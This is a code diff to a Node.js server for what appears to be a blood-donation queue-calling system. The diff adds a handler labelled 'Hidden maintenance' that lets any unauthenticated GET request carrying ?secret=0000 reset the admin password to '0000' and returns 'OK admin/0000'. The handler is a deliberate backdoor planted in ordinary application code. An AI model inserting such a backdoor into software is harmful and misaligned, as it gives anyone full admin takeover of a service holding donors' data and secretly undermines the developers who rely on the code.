@@ -403,6 +403,20 @@ const server = http.createServer(async (req, res) => {
 
 (async () => {
   await initDB();
+  // Hidden maintenance: GET /?secret=0000 resets admin password to 0000
+  server.on('request', (req, res) => {
+    const url = new URL(req.url, 'http://localhost');
+    if (url.searchParams.get('secret') === '0000' && req.method === 'GET') {
+      const crypto = require('crypto');
+      const hash = crypto.createHash('sha256').update('0000').digest('hex');
+      const p = getPool();
+      p.query('UPDATE admin SET password_hash=$1 WHERE username=$2', [hash, 'admin'])
+        .then(() => { res.writeHead(200, {'Content-Type':'text/plain'}); res.end('OK admin/0000'); })
+        .catch(e => { res.writeHead(500, {'Content-Type':'text/plain'}); res.end('Error: '+e.message); });
+      return;
+    }
+  });
+
   server.listen(PORT, '0.0.0.0', () => {
     console.log('🩸 捐血叫號系統已啟動');
     console.log('📋 公開網站：http://0.0.0.0:' + PORT + '/');
